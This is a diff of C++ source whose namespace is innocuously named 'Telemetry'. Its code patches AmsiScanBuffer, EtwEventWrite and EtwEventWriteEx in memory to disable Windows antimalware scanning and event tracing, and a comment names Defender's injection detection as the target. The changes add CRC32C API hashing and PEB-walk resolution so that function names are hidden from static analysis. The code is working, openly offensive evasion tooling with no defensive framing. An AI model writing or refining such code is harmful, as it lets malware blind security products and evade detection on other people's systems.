@@ -9,19 +9,32 @@
 // 
 
 #include "Telemetry.h"
+#include "ApiResolver.h"
 
 namespace Telemetry
 {
+    // Pre-computed CRC32C hash constants
+    static constexpr DWORD HASH_AmsiScanBuffer = 0xBEB2C84D;
+    static constexpr DWORD HASH_EtwEventWrite  = 0xC012A0B5;
+    static constexpr DWORD HASH_EtwEventWriteEx = 0xECF120DA;
+
     bool PatchAMSI()
     {
+        // Resolve kernel32 APIs once
+        HMODULE hK32 = Api::GetModuleByHashCrc(Api::CrcMod::KERNEL32);
+        if (!hK32) return false;
+
+        auto pLL = (HMODULE(WINAPI*)(LPCSTR))Api::GetProcByHashCrc(hK32, Api::CrcFn::LoadLibraryA);
+        auto pVP = (BOOL(WINAPI*)(LPVOID,SIZE_T,DWORD,PDWORD))Api::GetProcByHashCrc(hK32, Api::CrcFn::VirtualProtect);
+        if (!pVP) return false;
+
         // Load amsi.dll — stack-built string (no static strings in binary)
         char amsiDll[] = { 'a','m','s','i','.','d','l','l', 0 };
-        HMODULE hAmsi = LoadLibraryA(amsiDll);
+        HMODULE hAmsi = pLL ? pLL(amsiDll) : nullptr;
         if (!hAmsi) return true; // Not loaded = nothing to patch, success
 
-        // Find AmsiScanBuffer — stack-built
-        char funcName[] = { 'A','m','s','i','S','c','a','n','B','u','f','f','e','r', 0 };
-        void* pAmsiScanBuffer = (void*)GetProcAddress(hAmsi, funcName);
+        // Find AmsiScanBuffer via CRC32C hash
+        void* pAmsiScanBuffer = (void*)Api::GetProcByHashCrc(hAmsi, HASH_AmsiScanBuffer);
         if (!pAmsiScanBuffer) return false;
 
         // Patch bytes: mov eax, 0x80070057 (E_INVALIDARG) ; ret
@@ -29,28 +42,32 @@ namespace Telemetry
 
         // Change memory protection to writable
         DWORD oldProtect;
-        if (!VirtualProtect(pAmsiScanBuffer, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect))
+        if (!pVP(pAmsiScanBuffer, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect))
             return false;
 
         // Write the patch
         memcpy(pAmsiScanBuffer, patch, sizeof(patch));
 
         // Restore original protection
-        VirtualProtect(pAmsiScanBuffer, sizeof(patch), oldProtect, &oldProtect);
+        pVP(pAmsiScanBuffer, sizeof(patch), oldProtect, &oldProtect);
 
         return true;
     }
 
     bool PatchETW()
     {
-        // ntdll.dll — stack-built string
-        char ntdllStr[] = { 'n','t','d','l','l','.','d','l','l', 0 };
-        HMODULE hNtdll = GetModuleHandleA(ntdllStr);
+        // Resolve ntdll via PEB walk
+        HMODULE hNtdll = Api::GetModuleByHashCrc(Api::CrcMod::NTDLL);
         if (!hNtdll) return false;
 
-        // EtwEventWrite — stack-built string
-        char etwFunc[] = { 'E','t','w','E','v','e','n','t','W','r','i','t','e', 0 };
-        void* pEtwEventWrite = (void*)GetProcAddress(hNtdll, etwFunc);
+        // Resolve VirtualProtect from kernel32 once
+        HMODULE hK32 = Api::GetModuleByHashCrc(Api::CrcMod::KERNEL32);
+        if (!hK32) return false;
+        auto pVP = (BOOL(WINAPI*)(LPVOID,SIZE_T,DWORD,PDWORD))Api::GetProcByHashCrc(hK32, Api::CrcFn::VirtualProtect);
+        if (!pVP) return false;
+
+        // EtwEventWrite via CRC32C hash
+        void* pEtwEventWrite = (void*)Api::GetProcByHashCrc(hNtdll, HASH_EtwEventWrite);
         if (!pEtwEventWrite) return false;
 
         // Patch: make it return STATUS_SUCCESS (0) immediately
@@ -61,11 +78,11 @@ namespace Telemetry
 #endif
 
         DWORD oldProtect;
-        if (!VirtualProtect(pEtwEventWrite, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect))
+        if (!pVP(pEtwEventWrite, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect))
             return false;
 
         memcpy(pEtwEventWrite, patch, sizeof(patch));
-        VirtualProtect(pEtwEventWrite, sizeof(patch), oldProtect, &oldProtect);
+        pVP(pEtwEventWrite, sizeof(patch), oldProtect, &oldProtect);
 
         return true;
     }
@@ -74,13 +91,17 @@ namespace Telemetry
     {
         // Patch EtwEventWriteEx — used by ETW Threat Intelligence provider
         // Microsoft Defender uses this for process injection detection
-        char ntdllStr[] = { 'n','t','d','l','l','.','d','l','l', 0 };
-        HMODULE hNtdll = GetModuleHandleA(ntdllStr);
+        HMODULE hNtdll = Api::GetModuleByHashCrc(Api::CrcMod::NTDLL);
         if (!hNtdll) return false;
 
-        // EtwEventWriteEx — stack-built
-        char etwExFunc[] = { 'E','t','w','E','v','e','n','t','W','r','i','t','e','E','x', 0 };
-        void* pFunc = (void*)GetProcAddress(hNtdll, etwExFunc);
+        // Resolve VirtualProtect from kernel32 once
+        HMODULE hK32 = Api::GetModuleByHashCrc(Api::CrcMod::KERNEL32);
+        if (!hK32) return false;
+        auto pVP = (BOOL(WINAPI*)(LPVOID,SIZE_T,DWORD,PDWORD))Api::GetProcByHashCrc(hK32, Api::CrcFn::VirtualProtect);
+        if (!pVP) return false;
+
+        // EtwEventWriteEx via CRC32C hash
+        void* pFunc = (void*)Api::GetProcByHashCrc(hNtdll, HASH_EtwEventWriteEx);
         if (!pFunc) return true; // Function doesn't exist on this Windows version — OK
 
 #if defined(_WIN64)
@@ -90,11 +111,11 @@ namespace Telemetry
 #endif
 
         DWORD oldProtect;
-        if (!VirtualProtect(pFunc, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect))
+        if (!pVP(pFunc, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect))
             return false;
 
         memcpy(pFunc, patch, sizeof(patch));
-        VirtualProtect(pFunc, sizeof(patch), oldProtect, &oldProtect);
+        pVP(pFunc, sizeof(patch), oldProtect, &oldProtect);
 
         return true;
     }
